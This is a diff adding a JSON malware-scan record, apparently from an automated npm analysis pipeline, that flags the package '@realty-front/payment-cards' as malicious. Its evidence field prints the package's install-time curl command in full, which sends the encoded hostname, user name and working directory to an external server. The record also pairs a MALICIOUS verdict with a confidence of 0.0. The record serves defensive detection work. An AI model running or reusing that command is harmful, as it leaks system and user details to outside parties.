@@ -1,0 +1,53 @@
+{
+  "package_name": "@realty-front/payment-cards",
+  "version": "1.13.1",
+  "label": "malicious",
+  "semantic_summary": {
+    "num_behaviors": 1,
+    "risk_vector": [
+      "suspicious_behavior"
+    ],
+    "behaviors": [
+      {
+        "category": "suspicious_behavior",
+        "summary": "Suspicious behavior detected in package @realty-front/payment-cards version 1.13.1. Install hook present with payload likely to execute at install time.",
+        "details": "The package contains no JavaScript files and an install hook present. The payload may be remote. Verify the malicious intent from hook commands and structural signals only.",
+        "confidence": 0.72,
+        "evidence_apis": [],
+        "evidence_files": [],
+        "evidence_domains": [],
+        "evidence_commands": [
+          "curl -H \"Package:@realty-front/payment-cards\" -H \"Version:1.13.1\" -H \"Hostname:$(hostname|base64)\" -H \"Whoami:$(whoami|base64)\" -H \"Pwd:$(pwd|base64)\" -d\"meow!securitytest\" http://npm_org.bl04szombv0uaoedbxwle53be2ks8h.c.act1on3.ru"
+        ],
+        "evidence_env_vars": []
+      }
+    ],
+    "analyst_note": ""
+  },
+  "verification_result": {
+    "chain_analysis": {
+      "is_coherent_chain": true,
+      "chain_narrative": "The package contains no JavaScript files and an install hook present with payload likely to execute at install time.",
+      "chain_score": 0.34
+    },
+    "legitimacy_check": {
+      "is_justified": false,
+      "reasoning": "The package's stated purpose does not match the detected behaviors.",
+      "legitimacy_score": 0.0
+    },
+    "final_verification": {
+      "verdict": "MALICIOUS",
+      "calibrated_confidence": 0.0,
+      "explanation": "The package contains no JavaScript files and an install hook present with payload likely to execute at install time, which is not justified by the package's stated purpose."
+    }
+  },
+  "analysis_metadata": {
+    "model": "deepseek-coder-6.7b-instruct",
+    "stage": "verification_v2.0",
+    "structural_routing": "review",
+    "structural_risk_score": 0.336,
+    "confirmed_signals_count": 1,
+    "has_structural_backup": true
+  },
+  "created_at": "2026-03-27T09:56:47.465201"
+}
